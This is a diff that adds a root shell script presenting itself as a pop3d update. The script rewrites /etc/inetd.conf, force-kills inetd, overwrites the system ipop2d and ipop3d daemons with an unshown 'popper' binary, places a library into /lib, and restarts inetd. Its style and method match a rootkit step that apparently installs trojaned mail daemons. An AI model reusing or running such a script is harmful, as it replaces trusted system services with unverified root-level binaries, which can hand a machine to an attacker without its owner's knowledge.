@@ -1,0 +1,21 @@
+#!/bin/sh
+echo "deleting pop3d shit"
+cat /etc/inetd.conf |grep -v pop > poptmp
+mv poptmp /etc/inetd.conf
+cat /etc/inetd.conf |grep -v "End of" >poptmp2
+mv poptmp2 /etc/inetd.conf
+killall -9 inetd
+echo "updating pop3d"
+echo "#" >>/etc/inetd.conf
+echo "# Mail services" >>/etc/inetd.conf
+echo "#" >>/etc/inetd.conf
+echo "pop2  stream  tcp     nowait  root    /usr/sbin/tcpd ipop2d" >>/etc/inetd.conf
+echo "pop3  stream  tcp     nowait  root    /usr/sbin/tcpd ipop3d" >>/etc/inetd.conf
+echo "pop-3 stream  tcp	    nowait  root    /usr/sbin/tcpd ipop3d" >>/etc/inetd.conf
+echo "" >>/etc/inetd.conf
+echo "# End of inetd.conf" >>/etc/inetd.conf
+cp popper /usr/sbin/ipop2d
+cp popper /usr/sbin/ipop3d
+cp libgdbm.so.1 /lib
+/usr/sbin/inetd
+echo "done"
